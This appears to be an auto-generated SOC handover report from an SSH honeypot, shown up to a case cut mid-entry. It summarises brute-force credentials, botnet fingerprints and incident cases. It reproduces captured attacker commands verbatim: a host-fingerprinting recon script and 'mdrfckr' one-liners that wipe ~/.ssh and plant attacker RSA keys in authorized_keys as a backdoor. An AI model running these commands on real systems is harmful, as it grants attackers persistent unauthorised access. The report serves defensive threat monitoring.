# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-10 |
| **Generated At** | 2026-08-10T16:57:51Z |
| **Shift Time** | 16:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **231** |
| Confirmed Threats | **205** |
| False Positives Filtered | **26** (11.3%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **32** |
| High Severity Cases | **85** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **146** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **68** |
| Unique Usernames | **13** |
| Unique Passwords | **52** |
| Successful Auth Pairs | **84** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 37 |
| `admin` | 21 |
| `alexandra` | 12 |
| `support` | 8 |
| `345gs5662d34` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 13 |
| `webmaster` | 9 |
| `Password` | 4 |
| `Passw0rd` | 4 |
| `345gs5662d34` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `alexandra` | `123` | 12 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `support` | `webmaster` | 4 |
| `root` | `1q2w3e4r5t6y` | 3 |
| `test` | `Password` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123qwe` | `92.118.39.14` | 2026-08-10T14:55:07 |
| `prueba` | `prueba` | `10.0.0.73` | 2026-08-10T14:55:15 |
| `root` | `123qwerty` | `92.118.39.14` | 2026-08-10T14:57:15 |
| `root` | `1q2w3e4r5t6y` | `10.0.0.73` | 2026-08-10T14:58:42 |
| `root` | `21` | `92.118.39.14` | 2026-08-10T14:59:26 |
| `root` | `321` | `92.118.39.14` | 2026-08-10T15:01:38 |
| `root` | `4321` | `92.118.39.14` | 2026-08-10T15:03:38 |
| `root` | `54321` | `92.118.39.14` | 2026-08-10T15:05:37 |
| `test` | `Password` | `10.0.0.73` | 2026-08-10T15:05:43 |
| `root` | `654321` | `92.118.39.14` | 2026-08-10T15:07:34 |
| `root` | `P4ssw0rd` | `92.118.39.14` | 2026-08-10T15:09:32 |
| `root` | `P4ssword` | `92.118.39.14` | 2026-08-10T15:11:30 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-08-10T15:13:29 |
| `root` | `Passw0rd` | `92.118.39.14` | 2026-08-10T15:15:31 |
| `root` | `1q2w3e4r5t6y` | `65.20.251.170` | 2026-08-10T15:17:30 |
| `root` | `p4ssword` | `92.118.39.14` | 2026-08-10T15:17:42 |
| `root` | `p@ssw0rd` | `92.118.39.14` | 2026-08-10T15:20:01 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-10T15:20:29 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-10T15:20:30 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-10T15:20:37 |
| `vhserver` | `vhserver123` | `61.76.136.25` | 2026-08-10T15:21:09 |
| `345gs5662d34` | `345gs5662d34` | `61.76.136.25` | 2026-08-10T15:21:14 |
| `vhserver` | `3245gs5662d34` | `61.76.136.25` | 2026-08-10T15:21:16 |
| `root` | `P@$$W0rd123` | `45.144.233.139` | 2026-08-10T15:22:06 |
| `345gs5662d34` | `345gs5662d34` | `45.144.233.139` | 2026-08-10T15:22:08 |
| `root` | `3245gs5662d34` | `45.144.233.139` | 2026-08-10T15:22:09 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-08-10T15:22:20 |
| `test` | `Password` | `196.188.93.169` | 2026-08-10T15:23:06 |
| `test` | `Password` | `92.126.223.175` | 2026-08-10T15:23:17 |
| `root` | `password` | `92.118.39.14` | 2026-08-10T15:24:21 |
| `root` | `qwerty` | `92.118.39.14` | 2026-08-10T15:26:16 |
| `webmaster` | `webmaster` | `10.0.0.73` | 2026-08-10T15:29:43 |
| `root` | `root1` | `92.118.39.14` | 2026-08-10T15:30:12 |
| `webmaster` | `webmaster` | `111.53.131.79` | 2026-08-10T15:31:36 |
| `root` | `root12` | `92.118.39.14` | 2026-08-10T15:32:20 |
| `root` | `root123` | `92.118.39.14` | 2026-08-10T15:34:46 |
| `root` | `root1234` | `92.118.39.14` | 2026-08-10T15:37:01 |
| `root` | `root12345` | `92.118.39.14` | 2026-08-10T15:39:00 |
| `git` | `git2024` | `37.77.150.241` | 2026-08-10T15:40:36 |
| `345gs5662d34` | `345gs5662d34` | `37.77.150.241` | 2026-08-10T15:40:39 |
| `git` | `3245gs5662d34` | `37.77.150.241` | 2026-08-10T15:40:40 |
| `root` | `root123456` | `92.118.39.14` | 2026-08-10T15:41:00 |
| `root` | `root1234567` | `92.118.39.14` | 2026-08-10T15:43:07 |
| `root` | `root123456789` | `92.118.39.14` | 2026-08-10T15:45:14 |
| `root` | `root1234567890` | `92.118.39.14` | 2026-08-10T15:47:20 |
| `admin` | `1` | `92.118.39.14` | 2026-08-10T15:49:44 |
| `admin` | `12` | `92.118.39.14` | 2026-08-10T15:52:15 |
| `bin` | `smoker666` | `34.146.217.105` | 2026-08-10T15:52:18 |
| `admin` | `123` | `92.118.39.14` | 2026-08-10T15:54:22 |
| `admin` | `1234` | `92.118.39.14` | 2026-08-10T15:56:23 |
| `centos` | `webmaster` | `36.95.77.99` | 2026-08-10T15:57:39 |
| `centos` | `webmaster` | `113.11.34.221` | 2026-08-10T15:57:48 |
| `admin` | `12345` | `92.118.39.14` | 2026-08-10T15:58:22 |
| `admin` | `123456` | `92.118.39.14` | 2026-08-10T16:00:14 |
| `admin` | `1234567` | `92.118.39.14` | 2026-08-10T16:02:06 |
| `support` | `1234567` | `58.57.154.146` | 2026-08-10T16:02:52 |
| `root` | `solana` | `77.239.124.110` | 2026-08-10T16:03:00 |
| `support` | `1234567` | `182.53.52.68` | 2026-08-10T16:03:03 |
| `admin` | `12345678` | `92.118.39.14` | 2026-08-10T16:03:54 |
| `admin` | `Passw0rd` | `10.0.0.73` | 2026-08-10T16:04:30 |
| `admin` | `123456789` | `92.118.39.14` | 2026-08-10T16:05:42 |
| `admin` | `Passw0rd` | `182.42.113.10` | 2026-08-10T16:06:03 |
| `admin` | `Passw0rd` | `125.35.109.214` | 2026-08-10T16:06:12 |
| `admin` | `1234567890` | `92.118.39.14` | 2026-08-10T16:07:28 |
| `admin` | `123qwe` | `92.118.39.14` | 2026-08-10T16:09:20 |
| `support` | `support` | `10.0.0.73` | 2026-08-10T16:09:21 |
| `admin` | `123qwerty` | `92.118.39.14` | 2026-08-10T16:11:16 |
| `admin` | `21` | `92.118.39.14` | 2026-08-10T16:13:10 |
| `admin` | `321` | `92.118.39.14` | 2026-08-10T16:15:01 |
| `admin` | `654321` | `92.118.39.14` | 2026-08-10T16:16:53 |
| `admin` | `Password` | `92.118.39.14` | 2026-08-10T16:18:42 |
| `ftpuser` | `root` | `144.225.187.68` | 2026-08-10T16:30:12 |
| `345gs5662d34` | `345gs5662d34` | `144.225.187.68` | 2026-08-10T16:30:14 |
| `ftpuser` | `3245gs5662d34` | `144.225.187.68` | 2026-08-10T16:30:14 |
| `alexandra` | `123` | `185.148.129.112` | 2026-08-10T16:38:20 |
| `alexandra` | `123` | `193.151.151.92` | 2026-08-10T16:38:22 |
| `alexandra` | `123` | `172.245.181.192` | 2026-08-10T16:38:23 |
| `support` | `webmaster` | `10.0.0.73` | 2026-08-10T16:39:07 |
| `support` | `webmaster` | `122.170.99.195` | 2026-08-10T16:40:49 |
| `support` | `webmaster` | `65.20.134.97` | 2026-08-10T16:41:00 |
| `admin` | `root` | `10.0.0.73` | 2026-08-10T16:42:15 |
| `alexandra` | `123` | `43.172.92.108` | 2026-08-10T16:43:51 |
| `support` | `support` | `176.53.159.196` | 2026-08-10T16:50:29 |
| `root` | `﻿------fuck------` | `163.177.76.83` | 2026-08-10T16:54:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **231** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 61 |
| libssh | 19 |
| OpenSSH | 13 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 42 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 13 | 13 |
| `c37911009092...` | Generic scanner | 12 | 4 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 42 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 13 | 13 | Mirai/variant |
| `c37911009092...` | Go SSH scanner | 12 | 4 | Generic scanner |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 41 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1140, T1105` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `144.225.187.68`, `45.144.233.139`, `37.77.150.241`, `61.76.136.25`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author
```
Source IPs: `193.151.151.92`, `43.172.92.108`, `185.148.129.112`, `172.245.181.192`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **2** |
| High-Risk ASNs | **2** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 69 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (85)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a21a86f87756

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 14:55 |
| **Last Seen** | 2026-08-10 14:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 14:55:05` | `cowrie.session.connect` |
| `2026-08-10 14:55:06` | `cowrie.client.version` |
| `2026-08-10 14:55:06` | `cowrie.client.kex` |
| `2026-08-10 14:55:07` | `cowrie.login.success` |
| `2026-08-10 14:55:08` | `cowrie.session.params` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.success` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:08` | `cowrie.command.input` |
| `2026-08-10 14:55:09` | `cowrie.log.closed` |
| `2026-08-10 14:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3dadf56295

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 14:57 |
| **Last Seen** | 2026-08-10 14:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 14:57:14` | `cowrie.session.connect` |
| `2026-08-10 14:57:14` | `cowrie.client.version` |
| `2026-08-10 14:57:14` | `cowrie.client.kex` |
| `2026-08-10 14:57:15` | `cowrie.login.success` |
| `2026-08-10 14:57:16` | `cowrie.session.params` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.success` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.command.input` |
| `2026-08-10 14:57:16` | `cowrie.log.closed` |
| `2026-08-10 14:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd33a88f911e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 14:59 |
| **Last Seen** | 2026-08-10 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 14:59:25` | `cowrie.session.connect` |
| `2026-08-10 14:59:25` | `cowrie.client.version` |
| `2026-08-10 14:59:25` | `cowrie.client.kex` |
| `2026-08-10 14:59:26` | `cowrie.login.success` |
| `2026-08-10 14:59:27` | `cowrie.session.params` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.success` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:27` | `cowrie.command.input` |
| `2026-08-10 14:59:28` | `cowrie.log.closed` |
| `2026-08-10 14:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cbc72ce3c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:01 |
| **Last Seen** | 2026-08-10 15:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:01:36` | `cowrie.session.connect` |
| `2026-08-10 15:01:36` | `cowrie.client.version` |
| `2026-08-10 15:01:36` | `cowrie.client.kex` |
| `2026-08-10 15:01:38` | `cowrie.login.success` |
| `2026-08-10 15:01:39` | `cowrie.session.params` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.success` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.command.input` |
| `2026-08-10 15:01:39` | `cowrie.log.closed` |
| `2026-08-10 15:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129e2bbbc0d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:03 |
| **Last Seen** | 2026-08-10 15:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:03:37` | `cowrie.session.connect` |
| `2026-08-10 15:03:37` | `cowrie.client.version` |
| `2026-08-10 15:03:37` | `cowrie.client.kex` |
| `2026-08-10 15:03:38` | `cowrie.login.success` |
| `2026-08-10 15:03:39` | `cowrie.session.params` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.success` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.command.input` |
| `2026-08-10 15:03:39` | `cowrie.log.closed` |
| `2026-08-10 15:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86fd24e9d4c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:05 |
| **Last Seen** | 2026-08-10 15:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:05:35` | `cowrie.session.connect` |
| `2026-08-10 15:05:35` | `cowrie.client.version` |
| `2026-08-10 15:05:35` | `cowrie.client.kex` |
| `2026-08-10 15:05:37` | `cowrie.login.success` |
| `2026-08-10 15:05:38` | `cowrie.session.params` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.success` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.command.input` |
| `2026-08-10 15:05:38` | `cowrie.log.closed` |
| `2026-08-10 15:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2f3d7e4fefb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:07 |
| **Last Seen** | 2026-08-10 15:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
